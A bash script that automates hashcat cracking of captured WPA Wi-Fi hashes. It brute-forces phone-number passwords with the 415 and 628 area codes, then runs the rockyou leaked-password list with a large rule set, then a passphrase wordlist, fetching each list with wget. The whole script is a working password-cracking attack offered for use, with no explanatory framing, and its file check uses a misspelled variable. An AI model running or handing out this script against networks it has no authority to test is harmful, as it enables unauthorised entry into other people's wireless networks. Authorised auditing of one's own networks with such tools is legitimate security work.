#!/bin/bash
echo "############################################################"
echo "##             Trying the Phone Number Attack             ##"
echo "############################################################"

echo "💀 |   Trying all 415 numbers"
hashcat -m 22000 $1 -w 3 --quiet -a3 -1 "?d" "415?1?1?1?1?1?1?1"
echo "💀 |   Trying all 628 numbers"
hashcat -m 22000 $1 -w 3 --quiet -a3 -1 "?d" "628?1?1?1?1?1?1?1"


echo "############################################################"
echo "##              Trying the Rockyou Wordlist               ##"
echo "############################################################"

ROCK_FILE=rockyou.txt
if [ -f "$ROCK_FILE" ]; then
    echo "$ROCK_FILE exists."
else 
    wget https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt
fi

#DIVE_FILE=dive.rule
#if [ -f "$DIVE_FILE" ]; then
#    echo "$DIVE_FILE exists."
#else 
#    wget https://raw.githubusercontent.com/hashcat/hashcat/master/rules/dive.rule
#fi

ORTRTE_FILE=OneRuleToRuleThemAll.rule
if [ -f "$ORTRTE_FIL" ]; then
    echo "$ORTRTE_FIL exists."
else 
    wget https://raw.githubusercontent.com/NotSoSecure/password_cracking_rules/master/OneRuleToRuleThemAll.rule
fi


hashcat -a 0 -m 22000 $1 -w 3 --quiet -r OneRuleToRuleThemAll.rule rockyou.txt


echo "############################################################"
echo "##               Trying Passphrase attack                 ##"
echo "############################################################"
PASSPHRASE_LIST=passphrases.txt
if [ -f "$PASSPHRASE_LIST" ]; then
    echo "$PASSPHRASE_LIST exists."
else
    wget https://f002.backblazeb2.com/file/passphrase-wordlist/passphrases.txt
fi
PASSPHRASE_RULE_1=passphrase-rule1.rule
if [ -f "$PASSPHRASE_RULE_1" ]; then
    echo "$PASSPHRASE_RULE_1 exists."
else 
    wget https://raw.githubusercontent.com/initstring/passphrase-wordlist/master/hashcat-rules/passphrase-rule1.rule
fi
hashcat -a 0 -m 22000 $1 passphrases.txt --quiet -r passphrase-rule1.rule -w 3
